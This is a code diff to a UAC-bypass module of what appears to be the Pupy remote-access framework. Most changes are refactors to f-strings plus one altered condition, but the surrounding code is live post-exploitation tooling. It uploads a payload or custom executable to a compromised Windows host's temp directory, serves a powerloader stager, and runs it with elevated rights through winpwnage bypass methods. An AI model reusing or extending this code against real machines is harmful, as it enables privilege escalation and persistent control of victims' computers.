@@ -80,7 +80,7 @@ class BypassUAC(PupyModule):
             self.launch_scan()
             return
 
-        if not args.scan and not args.method:
+        if not args.method:
             method = self.launch_scan(print_result=False)
             if not method:
                 self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')
@@ -115,7 +115,12 @@ class BypassUAC(PupyModule):
         rjoin = self.client.remote('os.path', 'join')
         risfile = self.client.remote('os.path', 'isfile')
         tempdir = self.client.remote('tempfile', 'gettempdir', False)
-        random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
+        random_name = ''.join(
+            [
+                random.choice(string.ascii_letters + string.digits)
+                for _ in xrange(6)
+            ]
+        )
         local_file = ''
         remote_file = ''
         completion = None
@@ -134,7 +139,7 @@ class BypassUAC(PupyModule):
                     try:
                         listening_port = int(input("[?] Give me the listening port to use on the target: "))
                     except Exception as e:
-                        self.warning("You have to give me a valid port. Try again ({})".format(e))
+                        self.warning(f"You have to give me a valid port. Try again ({e})")
 
                 listening_address = address_port.split(':')[0]
                 bind_address_and_port = "{0}:{1}".format(listening_address, listening_port)
@@ -157,7 +162,6 @@ class BypassUAC(PupyModule):
 
             cmd, completion = powerloader.serve(self, client_conf)
 
-        # use a custom exe to execute as admin
         elif args.exe:
             cmd_args = shlex.split(args.exe, posix=False)
             arg0, argv = cmd_args[0], cmd_args[1:]
@@ -166,7 +170,7 @@ class BypassUAC(PupyModule):
             )
 
             if risfile(arg0):
-                self.info('Using remote cmd ({})'.format(args.exe))
+                self.info(f'Using remote cmd ({args.exe})')
                 cmd = args.exe
 
             elif os.path.exists(arg0):
@@ -176,17 +180,18 @@ class BypassUAC(PupyModule):
                         random_name=random_name,
                         ext="exe")
                 remote_file = rjoin(tempdir(), remoteFileName)
-                cmd = remote_file + ' ' + argv
+                cmd = f'{remote_file} {argv}'
             else:
-                self.error('Executable file not found: {}'.format(arg0))
+                self.error(f'Executable file not found: {arg0}')
                 return
 
-        # restart the current executable as admin
         else:
             self.info('Using current executable')
             exe = self.client.desc['exec_path'].split('\\')
             if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
-                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
+                self.warning(
+                    f"It seems that your current process is {self.client.desc['exec_path']}"
+                )
                 self.warning('It is not recommended to restart it')
                 return
 
@@ -194,19 +199,20 @@ class BypassUAC(PupyModule):
 
         # upload payload (ps1 or custom exe)
         if not args.restart and local_file:
-            self.info("Uploading to %s" % remote_file)
+            self.info(f"Uploading to {remote_file}")
             upload(self.client.conn, local_file, remote_file, chunk_size=1*1024*1024)
 
         # ------------------ Ready to launch the bypassuac ------------------
 
         self.info("Bypass uac could take few seconds, be patient...")
         bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)
-        result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)
-        if not result:
-            self.error('Nothing done, check if the id is on the list')
-        else:
+        if result := bypass_uac(uac=True, persist=False).run(
+            id=method, payload=cmd
+        ):
             self.parse_result(result, get_method_id=False)
 
+        else:
+            self.error('Nothing done, check if the id is on the list')
         if completion:
             if not completion.is_set():
                 self.info('Waiting for a powerloader status updates')
